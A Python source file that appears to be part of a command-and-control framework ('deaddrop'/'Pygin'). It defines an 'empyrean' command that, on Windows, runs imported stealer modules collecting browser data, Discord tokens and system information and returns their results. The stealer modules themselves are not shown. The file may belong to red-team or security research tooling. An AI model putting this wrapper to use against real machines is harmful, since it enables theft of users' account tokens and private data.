"""
Runs Empyrean.

This is the Python native version.
"""

from typing import Any, Optional, Type
import logging
import sys

from pydantic import BaseModel, Field

from deaddrop_meta.command_lib import CommandBase, RendererBase

# Conditional imports. Makes mypy slightly less angry.
if sys.platform == "win32":
    from src.commands.empyrean import Browsers, DiscordToken, SystemInfo

logger = logging.getLogger(__name__)


class EmpyreanArguments(BaseModel):
    """
    Simple helper class used for holding arguments.
    """

    exec_browser: bool = Field(
        default=True,
        json_schema_extra={"description": "Whether to run the browser module."},
    )
    exec_discord: bool = Field(
        default=True,
        json_schema_extra={"description": "Whether to run the Discord module."},
    )
    exec_sysinfo: bool = Field(
        default=True,
        json_schema_extra={"description": "Whether to run the system info module."},
    )


class EmpyreanResult(BaseModel):
    """
    Model representing the results of the shell command.
    """

    success: bool = Field(
        json_schema_extra={
            "description": (
                "Whether or not Empyrean ran. False if not on Windows, or if the"
                " executable was murdered before it could be run."
            )
        },
    )
    message: Optional[str] = Field(
        json_schema_extra={"description": "Any additional status message."},
    )
    browser_output: dict[str, Any] = Field(
        json_schema_extra={
            "description": (
                "Output of the browser module. Note that credentials are not currently"
                " extracted."
            )
        },
    )
    discord_output: dict[str, Any] = Field(
        json_schema_extra={
            "description": (
                "Output of the Discord module. Note that credentials are not currently"
                " extracted."
            )
        },
    )
    sysinfo_output: dict[str, Any] = Field(
        json_schema_extra={
            "description": (
                "Output of the system info module. Note that credentials are not currently"
                " extracted."
            )
        },
    )


class EmpyreanCommand(CommandBase):
    """
    Invoke Emyprean at the Pygin level (i.e. as Pygin code).

    Windows-only.
    """

    name: str = "empyrean"
    description: str = __doc__
    version: str = "0.0.1"
    argument_model: Type[BaseModel] = EmpyreanArguments
    result_model: Type[BaseModel] = EmpyreanResult

    command_renderer: Optional[Type[RendererBase]] = None

    @classmethod
    def execute_command(cls, args: dict[str, Any]) -> dict[str, Any]:
        cmd_args: EmpyreanArguments = EmpyreanArguments.model_validate(args)

        browser_data: dict[str, Any] = {}
        discord_data: dict[str, Any] = {}
        sysinfo_data: dict[str, Any] = {}

        if sys.platform != "win32":
            return cls.return_invalid_os()
        else:
            # The explicit "else" is so mypy correctly evaluates the control
            # flow for sys.platform.
            
            if cmd_args.exec_browser:
                browser_data = Browsers.run_module()
            if cmd_args.exec_discord:
                discord_data = DiscordToken.run_module()
            if cmd_args.exec_sysinfo:
                sysinfo_data = SystemInfo.run_module()

            result = EmpyreanResult(
                success=True,
                message=None,
                browser_output=browser_data,
                discord_output=discord_data,
                sysinfo_output=sysinfo_data,
            )

            return result.model_dump()

    @staticmethod
    def return_invalid_os() -> dict[str, Any]:
        """
        When this is run on a non-Windows environment, this does nothing.
        """
        result = EmpyreanResult(
            success=False,
            message="Pygin was running on a non-Windows environment.",
            browser_output={},
            sysinfo_output={},
            discord_output={},
        )

        return result.model_dump()
